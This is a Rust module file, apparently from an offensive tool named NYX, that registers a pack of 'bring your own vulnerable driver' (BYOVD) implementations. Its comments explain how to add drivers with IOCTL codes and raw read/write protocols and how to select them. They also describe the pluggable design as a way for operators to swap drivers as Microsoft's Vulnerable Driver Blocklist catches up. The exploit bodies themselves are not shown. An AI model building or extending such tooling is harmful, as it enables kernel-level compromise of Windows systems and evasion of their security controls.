//! BYOVD driver pack — pluggable vulnerable driver implementations.
//!
//! ## How to add a new driver (3 steps)
//!
//! 1. Create `byovd_drivers/<name>.rs` implementing `VulnDriverIoctl`.
//! 2. Add `pub mod <name>;` + a `pub use` re-export to this file.
//! 3. Wire it into `byovd::default_driver()` (`NYX_BYOVD` match arm).
//!
//! Each driver file is self-contained: IOCTL codes, device path, struct layout,
//! and the `raw_rw` wire protocol (a required trait method — no default).
//!
//! ## Driver selection
//!
//! Build-time: `NYX_BYOVD=shield` sets the default driver.
//! Runtime: `bootstrap_byovd_with(Box::new(Shield))` overrides.
//!
//! ## Blocklist awareness
//!
//! The Microsoft Vulnerable Driver Blocklist is updated via Windows Update.
//! No driver stays unblocklisted forever. The pluggable architecture lets
//! operators swap drivers without touching anything outside this directory.

pub mod alsysio;
pub mod shield;
pub mod wdtkernel;

// Re-export for convenience.
pub use alsysio::AlsysIo;
pub use shield::Shield;
pub use wdtkernel::WdtKernel;
